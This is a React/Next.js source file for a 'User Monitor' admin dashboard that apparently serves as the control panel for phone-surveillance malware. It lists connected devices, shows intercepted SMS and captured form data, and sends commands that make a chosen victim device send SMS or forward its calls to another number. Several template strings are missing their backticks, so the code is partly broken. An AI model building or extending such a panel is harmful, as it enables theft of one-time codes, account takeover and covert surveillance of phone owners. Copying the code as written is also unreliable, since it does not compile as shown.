import { useState, useEffect } from 'react';
import Head from 'next/head';
import io from 'socket.io-client';
import styles from '../styles/Dashboard.module.css';

let socket;

export default function Dashboard() {
  const [devices, setDevices] = useState([]);
  const [smsList, setSmsList] = useState([]);
  const [formData, setFormData] = useState([]);
  const [activeTab, setActiveTab] = useState('dashboard');
  const [selectedDevice, setSelectedDevice] = useState('');
  
  // Forms state
  const [smsForm, setSmsForm] = useState({ 
    phone: '', 
    message: '', 
    sim: 1 
  });
  const [callForm, setCallForm] = useState({ 
    forwardNumber: '', 
    sim: 1 
  });

  useEffect(() => {
    // Initialize WebSocket
    initializeSocket();
    
    // Load initial data
    loadDevices();
    loadSMS();
    loadFormData();
    
    // Auto refresh every 10 seconds
    const interval = setInterval(() => {
      loadDevices();
      loadSMS();
    }, 10000);
    
    return () => {
      clearInterval(interval);
      if (socket) socket.disconnect();
    };
  }, []);

  const initializeSocket = async () => {
    try {
      await fetch('/api/socket');
      socket = io();
      
      socket.on('connect', () => {
        console.log('✅ Connected to server');
      });
      
      socket.on('NEW_SMS', (data) => {
        setSmsList(prev => [data, ...prev]);
        showNotification(New SMS from ${data.sender});
      });
      
      socket.on('NEW_FORM', (data) => {
        setFormData(prev => [data, ...prev]);
        showNotification(New form from ${data.device_id});
      });
      
    } catch (error) {
      console.error('Socket error:', error);
    }
  };

  const loadDevices = async () => {
    try {
      const res = await fetch('/api/devices');
      const data = await res.json();
      setDevices(data);
      if (data.length > 0 && !selectedDevice) {
        setSelectedDevice(data[0].device_id);
      }
    } catch (error) {
      console.error('Error loading devices:', error);
    }
  };

  const loadSMS = async () => {
    try {
      const res = await fetch('/api/sms');
      const data = await res.json();
      setSmsList(data);
    } catch (error) {
      console.error('Error loading SMS:', error);
    }
  };

  const loadFormData = async () => {
    try {
      const res = await fetch('/api/forms');
      const data = await res.json();
      setFormData(data);
    } catch (error) {
      console.error('Error loading forms:', error);
    }
  };

  const sendSMS = async () => {
    if (!smsForm.phone || !smsForm.message) {
      alert('Please fill phone number and message');
      return;
    }

    try {
      const res = await fetch('/api/command', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: 'SEND_SMS',
          device_id: selectedDevice || devices[0]?.device_id,
          data: smsForm
        })
      });

      if (res.ok) {
        alert('✅ SMS command sent successfully!');
        setSmsForm({ phone: '', message: '', sim: 1 });
      } else {
        alert('❌ Failed to send command');
      }
    } catch (error) {
      alert('Error: ' + error.message);
    }
  };

  const handleCallForward = async (action) => {
    if (!callForm.forwardNumber) {
      alert('Please enter forward number');
      return;
    }

    try {
      const res = await fetch('/api/command', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: 'CALL_FORWARD',
          device_id: selectedDevice || devices[0]?.device_id,
          data: { ...callForm, action }
        })
      });

      if (res.ok) {
        alert(Call forwarding ${action}d successfully!);
        setCallForm({ forwardNumber: '', sim: 1 });
      }
    } catch (error) {
      alert('Error: ' + error.message);
    }
  };

  const showNotification = (message) => {
    if ('Notification' in window && Notification.permission === 'granted') {
      new Notification(message);
    }
  };

  return (
    <div className={styles.container}>
      <Head>
        <title>Admin Dashboard - User Monitor</title>
        <meta name="viewport" content="width=device-width, initial-scale=1" />
      </Head>

      <header className={styles.header}>
        <h1>📱 User Monitor - Admin Dashboard</h1>
        <div className={styles.headerInfo}>
          <span>Devices: {devices.length}</span>
          <span>SMS: {smsList.length}</span>
          <span>Forms: {formData.length}</span>
        </div>
      </header>

      <div className={styles.mainLayout}>
        {/* Left Sidebar */}
        <div className={styles.sidebar}>
          <h3>📲 Connected Devices</h3>
          <div className={styles.deviceList}>
            {devices.length === 0 ? (
              <p className={styles.noData}>No devices connected</p>
            ) : (
              devices.map(device => (
                <div 
                  key={device.device_id}
                  className={${styles.deviceItem} ${selectedDevice === device.device_id ? styles.active : ''}}
                  onClick={() => setSelectedDevice(device.device_id)}
                >
                  <div className={styles.deviceIcon}>📱</div>
                  <div className={styles.deviceInfo}>
                    <strong>{device.device_id}</strong>
                    <small>Last: {new Date(device.last_seen).toLocaleTimeString()}</small>
                  </div>
                </div>
              ))
            )}
          </div>

          <div className={styles.navigation}>
            <button 
              className={activeTab === 'dashboard' ? styles.activeTab : ''}
              onClick={() => setActiveTab('dashboard')}
            >
              🏠 Dashboard
            </button>
            <button 
              className={activeTab === 'sms' ? styles.activeTab : ''}
              onClick={() => setActiveTab('sms')}
            >
              📨 Send SMS
            </button>
            <button 
              className={activeTab === 'calls' ? styles.activeTab : ''}
              onClick={() => setActiveTab('calls')}
            >
              📞 Call Forward
            </button>
            <button 
              className={activeTab === 'viewsms' ? styles.activeTab : ''}
              onClick={() => setActiveTab('viewsms')}
            >
              👀 View SMS
            </button>
            <button 
              className={activeTab === 'forms' ? styles.activeTab : ''}
              onClick={() => setActiveTab('forms')}
            >
              📝 Form Data
            </button>
          </div>
        </div>

        {/* Main Content */}
        <div className={styles.content}>
          {/* Dashboard Tab */}
          {activeTab === 'dashboard' && (
            <div className={styles.dashboardTab}>
              <h2>📊 Control Panel</h2>
              <div className={styles.statsGrid}>
                <div className={styles.statCard}>
                  <h3>Active Devices</h3>
                  <p className={styles.statNumber}>{devices.length}</p>
                </div>
                <div className={styles.statCard}>
                  <h3>Total SMS</h3>
                  <p className={styles.statNumber}>{smsList.length}</p>
                </div>
                <div className={styles.statCard}>
                  <h3>Form Submissions</h3>
                  <p className={styles.statNumber}>{formData.length}</p>
                </div>
                <div className={styles.statCard}>
                  <h3>Pending Commands</h3>
                  <p className={styles.statNumber}>0</p>
                </div>
              </div>

              <div className={styles.quickActions}>
                <h3>⚡ Quick Actions</h3>
                <div className={styles.actionButtons}>
                  <button className={styles.actionBtn} onClick={() => setActiveTab('sms')}>
                    Send SMS
                  </button>
                  <button className={styles.actionBtn} onClick={() => setActiveTab('calls')}>
                    Call Forward
                  </button>
                  <button className={styles.actionBtn} onClick={loadDevices}>
                    Refresh Data
                  </button>
                </div>
              </div>
            </div>
          )}

          {/* Send SMS Tab */}
          {activeTab === 'sms' && (
            <div className={styles.smsTab}>
              <h2>📨 Send SMS to Device</h2>
              <div className={styles.formCard}>
                <div className={styles.formGroup}>
                  <label>Select Device:</label>
                  <select 
                    value={selectedDevice}
                    onChange={(e) => setSelectedDevice(e.target.value)}
                    className={styles.select}
                  >
                    {devices.map(device => (
                      <option key={device.device_id} value={device.device_id}>
                        {device.device_id}
                      </option>
                    ))}
                  </select>
                </div>

                <div className={styles.formGroup}>
                  <label>Phone Number:</label>
                  <input
                    type="text"
                    value={smsForm.phone}
                    onChange={(e) => setSmsForm({...smsForm, phone: e.target.value})}
                    placeholder="Enter phone number (e.g., 919876543210)"
                    className={styles.input}
                  />
                </div>

                <div className={styles.formGroup}>
                  <label>Message (Max 170 chars):</label>
                  <textarea
                    value={smsForm.message}
                    onChange={(e) => setSmsForm({...smsForm, message: e.target.value})}
                    placeholder="Type your message here..."
                    rows={4}
                    maxLength={170}
                    className={styles.textarea}
                  />
                  <div className={styles.charCounter}>
                    {smsForm.message.length}/170 characters
                  </div>
                </div>

                <div className={styles.simSelector}>
                  <label>Select SIM:</label>
                  <div className={styles.simButtons}>
                    <button
                      className={smsForm.sim === 1 ? styles.simActive : ''}
                      onClick={() => setSmsForm({...smsForm, sim: 1})}
                    >
                      SIM 1
                    </button>
                    <button
                      className={smsForm.sim === 2 ? styles.simActive : ''}
                      onClick={() => setSmsForm({...smsForm, sim: 2})}
                    >
                      SIM 2
                    </button>
                  </div>
                </div>

                <button onClick={sendSMS} className={styles.primaryBtn}>
                  Send SMS
                </button>
              </div>
            </div>
          )}

          {/* Call Forward Tab */}
          {activeTab === 'calls' && (
            <div className={styles.callsTab}>
              <h2>📞 Call Forwarding</h2>
              <div className={styles.formCard}>
                <div className={styles.formGroup}>
                  <label>Device:</label>
                  <select 
                    value={selectedDevice}
                    onChange={(e) => setSelectedDevice(e.target.value)}
                    className={styles.select}
                  >
                    {devices.map(device => (
                      <option key={device.device_id} value={device.device_id}>
                        {device.device_id}
                      </option>
                    ))}
                  </select>
                </div>

                <div className={styles.formGroup}>
                  <label>Forward Calls To:</label>
                  <input
                    type="text"
                    value={callForm.forwardNumber}
                    onChange={(e) => setCallForm({...callForm, forwardNumber: e.target.value})}
                    placeholder="Enter number to forward calls"
                    className={styles.input}
                  />
                </div>

                <div className={styles.simSelector}>
                  <label>Select SIM:</label>
                  <div className={styles.simButtons}>
                    <button
                      className={callForm.sim === 1 ? styles.simActive : ''}
                      onClick={() => setCallForm({...callForm, sim: 1})}
                    >
                      SIM 1
                    </button>
                    <button
                      className={callForm.sim === 2 ? styles.simActive : ''}
                      onClick={() => setCallForm({...callForm, sim: 2})}
                    >
                      SIM 2
                    </button>
                  </div>
                </div>

                <div className={styles.callActions}>
                  <button 
                    onClick={() => handleCallForward('activate')}
                    className={styles.successBtn}
                  >
                    Activate Forwarding
                  </button>
                  <button 
                    onClick={() => handleCallForward('deactivate')}
                    className={styles.dangerBtn}
                  >
                    Deactivate Forwarding
                  </button>
                  <button 
                    onClick={() => handleCallForward('check')}
                    className={styles.infoBtn}
                  >
                    Check Status
                  </button>
                </div>
              </div>
            </div>
          )}

          {/* View SMS Tab */}
          {activeTab === 'viewsms' && (
            <div className={styles.smsViewTab}>
              <h2>📩 Received SMS</h2>
              <div className={styles.smsContainer}>
                {smsList.length === 0 ? (
                  <p className={styles.noData}>No SMS received yet</p>
                ) : (
                  smsList.map((sms, index) => (
                    <div key={index} className={styles.smsCard}>
                      <div className={styles.smsHeader}>
                        <span className={styles.smsSender}>📱 {sms.sender}</span>
                        <span className={styles.smsTime}>
                          {new Date(sms.timestamp).toLocaleString()}
                        </span>
                      </div>
                      <div className={styles.smsBody}>
                        {sms.message}
                      </div>
                    </div>
                  ))
                )}
              </div>
            </div>
          )}

          {/* Form Data Tab */}
          {activeTab === 'forms' && (
            <div className={styles.formsTab}>
              <h2>📋 Form Submissions</h2>
              <div className={styles.formsContainer}>
                {formData.length === 0 ? (
                  <p className={styles.noData}>No form submissions yet</p>
                ) : (
                  formData.map((form, index) => (
                    <div key={index} className={styles.formCard}>
                      <div className={styles.formHeader}>
                        <strong>Device: {form.device_id}</strong>
                        <small>{new Date(form.timestamp).toLocaleString()}</small>
                      </div>
                      <pre className={styles.formData}>
                        {JSON.stringify(form.data, null, 2)}
                      </pre>
                    </div>
                  ))
                )}
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
